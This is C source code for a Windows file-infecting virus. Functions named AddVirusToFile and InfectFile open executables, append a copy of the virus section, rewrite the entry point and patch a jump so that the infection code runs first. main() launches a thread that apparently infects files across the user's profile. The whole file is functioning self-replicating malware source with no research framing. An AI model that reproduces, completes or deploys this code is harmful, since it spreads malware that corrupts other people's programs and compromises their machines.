#include "everything.h"

#include "shared.h"


void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress);

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);

int main();

void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress)
{
    if ( *((PUCHAR)data + entry_point) != 0xe9 )
    {
        return;
    }
    *(PDWORD)((PUCHAR)data + entry_point + 1) = main_addrress - (entry_point + 5);
    return;
}

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
{
    PVOID section_data = NULL;
    DWORD section_size = 0;
    DWORD virus_section_va = 0;
    DWORD this_file_entry_point = GetEntryPoint(data->this_file_base_address);
    PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);

    virus_section_va = virus_section->VirtualAddress;
    section_size = virus_section->SizeOfRawData;
    section_data = data->iat->fnVirtualAlloc(
        NULL, 
        section_size, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );

    MemCopy(section_data, (PUCHAR)data->this_file_base_address + virus_section_va, section_size);

    ModifyJumpInstructionToVirusCode(section_data, GetEntryPoint(data->this_file_base_address) - virus_section_va, (DWORD)((DWORD)&main - (DWORD)data->this_file_base_address) - virus_section_va);

    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data, section_size, data);

    SetEntryPoint(file_data, virus_section_in_target->VirtualAddress + ((DWORD)&main - (DWORD)data->this_file_base_address - virus_section_va));

    data->iat->fnVirtualFree(
        section_data,
        0, 
        MEM_RELEASE
    );

    *(DWORD*)new_file_size = file_size + section_size;
    return;
}

void WINAPI InfectFile(PSTR file_name, PDATA data)
{
    HANDLE handle_file;
    HANDLE handle_mapped_file;
    PVOID mapped_file_address;
    ULONG file_size, new_file_size, bytes_read;
    PVOID file_data = NULL;
    DWORD number_of_bytes_written = 0;

    handle_file = data->iat->fnCreateFileA(
        file_name, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL,
        OPEN_EXISTING,
        0,NULL
    );

    if (handle_file == INVALID_HANDLE_VALUE)
    {
        goto END_FUNCTION;
    }

    file_size = data->iat->fnGetFileSize(handle_file, NULL);
    new_file_size = file_size;
    
    file_data = data->iat->fnVirtualAlloc(
        NULL, 
        file_size + 0x1000000, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!file_data)
    {
        goto END_FUNCTION;
    }

    if (!data->iat->fnReadFile(handle_file, file_data, file_size, &bytes_read, NULL))
    {
        goto END_FUNCTION;
    }

    if (!IsValidExecutable(file_data) || IsVirusExistedInFile(file_data))
    {
        goto END_FUNCTION;
    }

    AddVirusToFile(file_data, file_size, data, &new_file_size);

    handle_mapped_file = data->iat->fnCreateFileMappingA(handle_file, NULL, PAGE_READWRITE, 0, new_file_size, NULL);
    if (!handle_mapped_file)
    {
        goto END_FUNCTION;
    }

    mapped_file_address = data->iat->fnMapViewOfFile(handle_mapped_file, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    MemCopy(mapped_file_address, file_data, new_file_size);
    
    data->iat->fnFlushViewOfFile(mapped_file_address,0);
    data->iat->fnUnmapViewOfFile(mapped_file_address);
    data->iat->fnCloseHandle(handle_mapped_file);

    END_FUNCTION:
    if (handle_file != NULL)
    {
        data->iat->fnCloseHandle(handle_file);
    }
    if (file_data != NULL)
    {
        data->iat->fnVirtualFree(file_data, 0, MEM_RELEASE);
    }
    return;
} 

void EmptyFunction()
{
    return;
}

int main()
{
    IAT iat;
    DATA data;
    data.iat = &iat;
    GetFunctionAddresses(&data);
    data.iat->fnCreateThread(NULL, 0, InfectUserProfile, &data, 0, NULL);
    EmptyFunction();
    return 0;
}